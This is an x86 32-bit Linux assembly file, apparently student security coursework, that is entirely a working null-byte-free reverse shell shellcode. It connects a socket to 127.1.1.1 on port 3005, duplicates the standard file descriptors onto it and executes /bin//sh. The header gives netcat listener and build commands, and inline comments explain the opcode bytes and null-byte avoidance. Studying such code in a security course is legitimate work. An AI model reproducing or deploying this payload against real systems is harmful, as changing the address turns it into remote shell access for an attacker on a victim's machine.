; NOM / Prénom : NEHME Ali - MEZANI Nazim
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;

section .text
    global _start

; nc -l -p 3005 -s 127.1.1.1
; nasm -f elf32 reverseShell.s && ld -m elf_i386 reverseShell.o && strace ./a.out

_start:

    push 0x0101017f         ;; 68 7f 01 01 01
    push word 0xbd0b        ;; 66 68 0b bd

    sub eax, eax            ;; 29 c0
    push word 0x0167        ;; 66 68 67 01
    pop eax                 ;; 58
    
    push eax                ;; 50
    pop ebx                 ;; 5b
    push 0x2                ;; 6a 02
    pop ebx                 ;; 5b

    xor ecx, ecx            ;; 31 c9
    push 0x1                ;; 6a 01
    pop ecx                 ;; 59

    xor edx, edx            ;; 31 D2
    int 0x80                ;; cd 80
    mov ebx, eax            ;; 89 C3

    mov ax, 0x16a           ;; 66 B8 6a 01
    mov ecx, esp            ;; 89 E1
    mov dl, 0x10            ;; B2 10
    int 0x80                ;; cd 80

    ;; pour ne pas avoir de nullbyte avec "int 0x80" ET "add eax, 0x3"
    push eax                ;; 50
    push 0x68732f6e         ;; 68 6e 2f 73 68
    push 0x69622f2f         ;; 68 2f 2f 62 69

    add eax, 0x3            ;; 04 03
    mov ecx, eax            ;; 89 C1

    not_finish_dup:         ;; jump ==> 0xff - 0x06 => 0xf9 (0x06 == nombre de caractères pour atteindre le label "not_finish_dup")
    mov al, 0x3f            ;; B0 3f
    dec ecx                 ;; 49
    int 0x80                ;; cd 80
    jnz not_finish_dup      ;; 75 f9

    mov eax, ecx            ;; 89 C8
    mov dl, 0x0b            ;; b2 0b
    xchg eax, edx           ;; 92       ;; Etant donné que mov eax, 0x0b (b0 03), la solution qu'on a trouvé est d'inverser le stockage des données pour eax & edx (vu que mov edx, 0x0b ==> b2 0b) puis de les remettre à leur place avec xchg 

    mov ebx, esp            ;; 89 e3
    int 0x80                ;; cd 80